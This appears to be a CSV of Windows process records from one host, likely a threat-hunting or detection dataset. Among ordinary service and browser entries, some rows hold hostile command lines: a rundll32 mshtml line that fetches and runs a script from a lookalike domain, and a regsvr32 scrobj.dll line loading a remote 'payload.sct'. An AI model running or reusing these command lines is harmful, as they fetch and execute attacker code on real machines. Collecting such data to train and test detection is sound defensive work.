,arguments,hostname,name,path,pid,username
37,C:\Windows\system32\svchost.exe -k DcomLaunch,0006PKYSW,svchost.exe,C:\Windows\system32,3344,NT AUTHORITY\SYSTEM
39,"""dwm.exe""",0006PKYSW,dwm.exe,C:\Windows\system32,2208,NT AUTHORITY\SYSTEM
40,C:\Windows\system32\svchost.exe -k NetworkService,0006PKYSW,svchost.exe,C:\Windows\system32,3940,NT AUTHORITY\SYSTEM
41,\??\C:\Windows\system32\conhost.exe 0x4,0006PKYSW,conhost.exe,C:\Windows\system32,2876,NT AUTHORITY\SYSTEM
43,"""C:\Users\mat.robinson7\AppData\Local\GoToMeeting\9508\g2mstart.exe"" ""/Action Host"" ""/BrokerServiceSuffix @ISL1"" ""/Build 9508"" ""/Download Auto"" ""/EGWAddress 216.115.208.230"" ""/EGWDNS egwglobal.gotomeeting.com"" ""/EGWPort 80 443 8200"" ""/Mode Normal"" ""/Product g2m"" ""/colClientUiReadyEvent Global\55848945-2CEA-4978-BF24-0C6A3B11E66E"" ""/sessionTrackingId e0-PH0LsK8MFgg2A9ZkKW16jt2JkQ4bP""",0006PKYSW,g2mstart.exe,C:\Users\mat.robinson7\AppData\Local\GoToMeeting\9508,1200,mat.robinson7
44,C:\ProgramData\McAfee\Direct\McDiReg.exe -MONITOR_PI2 9508,0006PKYSW,McDiReg.exe,C:\ProgramData\McAfee\Direct,4818,darc.flore1
46,"""C:\Program Files\Common Files\McAfee\TaskScheduler\McAMTaskAgent.exe"" -Embedding",0006PKYSW,McAMTaskAgent.exe,C:\Program Files\Common Files\McAfee\TaskScheduler,252,darc.flore1
48,"""dwm.exe""",0006PKYSW,dwm.exe,C:\Windows\system32,3448,NT AUTHORITY\SYSTEM
49,"""C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe"" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca",0006PKYSW,ShellExperienceHost.exe,C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy,3028,NT AUTHORITY\SYSTEM
50,C:\Windows\System32\RuntimeBroker.exe -Embedding,0006PKYSW,RuntimeBroker.exe,C:\Windows\System32,4216,NT AUTHORITY\SYSTEM
51,"""C:\Users\mat.robinson7\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=12376823585177401963 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=12376823585177401963 --renderer-client-id=7 --mojo-platform-channel-handle=2368 /prefetch:1",0006PKYSW,opera.exe,C:\Users\mat.robinson7\AppData\Local\Programs\Opera\56.0.3051.52,3766,mat.robinson7
52,C:\Windows\system32\svchost.exe -k RPCSS,0006PKYSW,svchost.exe,C:\Windows\system32,496,NT AUTHORITY\SYSTEM
53,C:\Windows\System32\spoolsv.exe,0006PKYSW,spoolsv.exe,C:\Windows\System32,4760,NT AUTHORITY\SYSTEM
59,sihost.exe,0006PKYSW,sihost.exe,C:\Windows\System32,5852,NT AUTHORITY\SYSTEM
60,C:\ProgramData\McAfee\McInstruTrack\McInstruTrack.exe /SP:0,0006PKYSW,McInstruTrack.exe,C:\ProgramData\McAfee\McInstruTrack,4761,darc.flore1
62,"""C:\Users\mat.robinson7\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=gpu-process --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --gpu-preferences=KAAAAAAAAACAAwBAAQAAAAAAAAAAAGAAAAAAAAAAAAAIAAAAAAAAACgAAAAEAAAAIAAAAAAAAAAoAAAAAAAAADAAAAAAAAAAOAAAAAAAAAAQAAAAAAAAAAAAAAAKAAAAEAAAAAAAAAAAAAAACwAAABAAAAAAAAAAAQAAAAoAAAAQAAAAAAAAAAEAAAALAAAA --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --service-request-channel-token=7207758415534163028 --mojo-platform-channel-handle=1472 --ignored="" --type=renderer "" /prefetch:2",0006PKYSW,opera.exe,C:\Users\mat.robinson7\AppData\Local\Programs\Opera\56.0.3051.52,4611,mat.robinson7
64,ModuleCoreService.exe /startUserModeHosting=4_TIME_TO_DIE,0006PKYSW,ModuleCoreService.exe,c:\program files\common files\mcafee\modulecore,3813,darc.flore1
65,C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235},0006PKYSW,dllhost.exe,C:\Windows\system32,6000,NT AUTHORITY\SYSTEM
67,"""C:\Users\mat.robinson7\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=2685998191293934672 --lang=en-GB --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=2685998191293934672 --renderer-client-id=12 --mojo-platform-channel-handle=4360 /prefetch:1",0006PKYSW,opera.exe,C:\Users\mat.robinson7\AppData\Local\Programs\Opera\56.0.3051.52,6302,mat.robinson7
70,"""C:\Program Files\Common Files\mcafee\Platform\mcuicnt.exe"" ""C:\Program Files\Common Files\McAfee\ActWiz\mcactwiz.dll"" nosplash:",0006PKYSW,mcuicnt.exe,C:\Program Files\Common Files\mcafee\Platform,3382,darc.flore1
72,"""C:\Program Files\McAfee\MAT\McPvTray.exe""",0006PKYSW,McPvTray.exe,C:\Program Files\McAfee\MAT,3997,darc.flore1
76,C:\Windows\system32\svchost.exe -k appmodel,0006PKYSW,svchost.exe,C:\Windows\system32,3316,NT AUTHORITY\SYSTEM
79,"""C:\Program Files\Common Files\McAfee\PEF\CORE\PEFService.exe""",0006PKYSW,PEFService.exe,C:\Program Files\Common Files\McAfee\PEF\CORE,3687,darc.flore1
83,C:\Windows\system32\svchost.exe -k LocalService,0006PKYSW,svchost.exe,C:\Windows\system32,4152,NT AUTHORITY\SYSTEM
84,"""C:\\Program Files\\Common Files\\McAfee\ModuleCore\\ProtectedModuleHost.exe""",0006PKYSW,ProtectedModuleHost.exe,C:\Program Files\Common Files\McAfee\ModuleCore,4515,darc.flore1
87,"C:\Windows\System32\rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:\http://www.Рintrest.net/kmbmmgo51n.js'"").Exec();""",0006PKYSW,rundll32.exe,C:\Windows\System32\rundll32.exe,2732,darc.flore1
88,"""C:\Program Files\McAfee\WebAdvisor\ServiceHost.exe""",0006PKYSW,ServiceHost.exe,C:\Program Files\McAfee\WebAdvisor,294,darc.flore1
90,,,utilman.exe,C:\Windows\System32\utilman.exe,5384,NT AUTHORITY\SYSTEM
91,"""C:\Program Files\Common Files\McAfee\AMCore\mcshield.exe""",0006PKYSW,mcshield.exe,C:\Program Files\Common Files\McAfee\AMCore,2669,darc.flore1
94,C:\Windows\system32\svchost.exe -k UnistackSvcGroup,0006PKYSW,svchost.exe,C:\Windows\system32,3140,NT AUTHORITY\SYSTEM
95,C:\Windows\System32\svchost.exe -k netsvcs,0006PKYSW,svchost.exe,C:\Windows\System32\svchost.exe,3552,lea.russel33
97,"""C:\Users\mat.robinson7\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --start-maximized --ran-launcher",0006PKYSW,opera.exe,C:\Users\mat.robinson7\AppData\Local\Programs\Opera\56.0.3051.52,2639,mat.robinson7
98,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted,0006PKYSW,svchost.exe,C:\Windows\System32,3812,NT AUTHORITY\SYSTEM
104,"""C:\Users\darc.flore1\AppData\Local\Temp\scoped_dir9616_4071\mcafee_trial_setup_433.0207.3919_key.exe"" ",0006PKYSW,mcafee_trial_setup_433.0207.3919_key.exe,C:\Users\darc.flore1\AppData\Local\Temp\scoped_dir9616_4071,4647,darc.flore1
105,"""C:\Users\mat.robinson7\AppData\Local\GoToMeeting\9508\g2mcomm.exe"" ""Action=Host&amp;BrokerServiceSuffix=@ISL1&amp;Build=9508&amp;colClientUiReadyEvent=Global\55848945-2CEA-4978-BF24-0C6A3B11E66E&amp;Digest=1bc982ef0552b1fb859a423b1f290ef0&amp;Dir=C:\Users\mat.robinson7\AppData\Local\GoToMeeting\9508\&amp;Download=Auto&amp;EGWAddress=216.115.208.230&amp;EGWDNS=egwglobal.gotomeeting.com&amp;EGWPort=80 443 8200&amp;LoaderPath=C:\Users\mat.robinson7\AppData\Local\GoToMeeting\9508\g2mstart.exe&amp;LogName=c:\users\mat.robinson7\appdata\local\temp\logmeinlogs\gotomeeting\9508\2018-10-29_12.04.18.379\GoToMeeting.log&amp;Mode=Normal&amp;Path=g2mlauncher.exe&amp;Plugin=G2MLauncher&amp;Product=g2m&amp;sessionTrackingId=e0-PH0LsK8MFgg2A9ZkKW16jt2JkQ4bP&amp;UniqueId=16cc""",0006PKYSW,g2mcomm.exe,C:\Users\mat.robinson7\AppData\Local\GoToMeeting\9508,4915,mat.robinson7
106,C:\Windows\system32\dllhost.exe /Processid:{A7CCA429-5F8F-4A5B-B524-82C38D561286},0006PKYSW,dllhost.exe,C:\Windows\system32,2616,NT AUTHORITY\SYSTEM
108,"""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SpyNetServiceDss -RestrictPrivileges -AccessKey 5BDCBEBD-E077-6957-0484-82901932C7EC -Reinvoke",0006PKYSW,MpCmdRun.exe,C:\Program Files\Windows Defender,136,NT AUTHORITY\SYSTEM
109,"""C:\Program Files\Common Files\McAfee\Platform\Core\mchost.exe"" {e05dd3fd-ba47-4235-85a5-3789db83c8e1} /pid=444",0006PKYSW,mchost.exe,C:\Program Files\Common Files\McAfee\Platform\Core,1407,darc.flore1
115,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date,0006PKYSW,powershell.exe,C:\Windows\System32\powershell.exe,1516,darc.flore1
136,C:\Windows\System32\regsvr32 /u /n /s /i:\webdavserver\folder\payload.sct scrobj.dll,0006PKYSW,wscript.exe,C:\Windows\System32\wscript.exe,1164,NT AUTHORITY\SYSTEM
